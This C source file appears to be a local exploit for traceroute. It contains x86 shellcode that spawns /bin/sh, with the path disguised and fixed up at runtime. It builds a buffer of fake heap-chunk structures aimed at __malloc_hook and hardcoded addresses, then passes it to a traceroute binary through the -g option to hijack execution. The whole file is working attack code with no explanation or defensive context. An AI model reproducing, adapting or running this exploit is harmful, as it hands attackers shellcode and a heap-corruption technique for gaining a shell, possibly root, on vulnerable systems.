#include <stdio.h>
#include <unistd.h>
#include <string.h>

char code[] =
   "\xeb\x34"              /* jmp    GETADDR         */
   "\x90\x90\x90\x90"      /* nop nop nop nop        */
   "\x90\x90\x90\x90"      /* nop nop nop nop        */
   "\x90\x90\x90\x90"      /* nop nop nop nop        */
   "\x90\x90\x90\x90"      /* nop nop nop nop        */
			   /* RUNPROG:               */
   "\x5e"                  /* popl   %esi            */
   "\x89\x76\x08"          /* movl   %esi,0x8(%esi)  */
   "\x31\xc0"              /* xorl   %eax,%eax       */
   "\x88\x46\x07"          /* movb   %al,0x7(%esi)   */
   "\x89\x46\x0c"          /* movl   %eax,0xc(%esi)  */
   "\xfe\x06"              /* incb   (%esi)          */
   "\xfe\x46\x04"          /* incb   0x4(%esi)       */
   "\xb0\x0b"              /* movb   $0xb,%al        */
   "\x89\xf3"              /* movl   %esi,%ebx       */
   "\x8d\x4e\x08"          /* leal   0x8(%esi),%ecx  */
   "\x8d\x56\x0c"          /* leal   0xc(%esi),%edx  */
   "\xcd\x80"              /* int    $0x80           */
   "\x31\xdb"              /* xorl   %ebx,%ebx       */
   "\x89\xd8"              /* movl   %ebx,%eax       */
   "\x40"                  /* incl   %eax            */
   "\xcd\x80"              /* int    $0x80           */
			   /* GETADDR:               */
   "\xe8\xd7\xff\xff\xff"  /* call   RUNPROG         */
   ".bin.sh";              /* Program to run .XXX.XX */

extern void *__malloc_hook;

typedef struct glue {
	int	a;
	int	b;
	void	*p;
	void	*q;
} glue;

void print_hex(char *p)
{
	char	*q;

	q=p;

	while(*q) {
		if (*q > 32 && *q < 127) {
			printf("%c",*q);
		} else {
			printf(" ");
		}
		q++;
	}
}

int main(void)
{
	int	ipa=0x2E312E31;
	int	ipb=0x20312E31;
	int	oh=0x00000000;
	int	dummy=0x43434343;
	void	*mh=(void **)__malloc_hook;
	void	*usage=(void *)0x804a858;
/*	void	*us=(void *)0x804cd80;*/
	void	*us=(void *)0x804cd7a;
	char	buf[260];
	char	whocares[4096];
	char	*prog="/tmp/traceroute";
	glue	temp;
	FILE	*out;

	printf ("malloc_hook %x code %x\n",mh, usage);

	memset(buf, 0x47,256);
	buf[255]='\0';

	printf ("buf: %s\n", buf);
	temp.a=ipa;
	temp.b=ipb;
	temp.p=mh;
	temp.q=us+16;

	memcpy(buf, (void *)&temp,16);
	printf ("buf: %s\n", buf);

	temp.p=(void *)oh;
	temp.q=(void *)oh;
	temp.a=dummy;
/*	temp.b=dummy;*/
	temp.b=0xFFFFFF01;

	printf("code(%d)\n", sizeof(code));
	strncpy(buf+16, code, sizeof(code) -1);
	memcpy(buf+240, (void *)&temp, 0x10);
	printf ("buf: %s\n", buf);
	buf[255]='\0';
	
	out=fopen("/tmp/code","w");
	fputs(buf,out);
	fclose(out);
	printf("%s\n",whocares);

	execl(prog,prog,prog,"-g",buf,"-g 1","127.0.0.1", NULL);

	return 0;
}

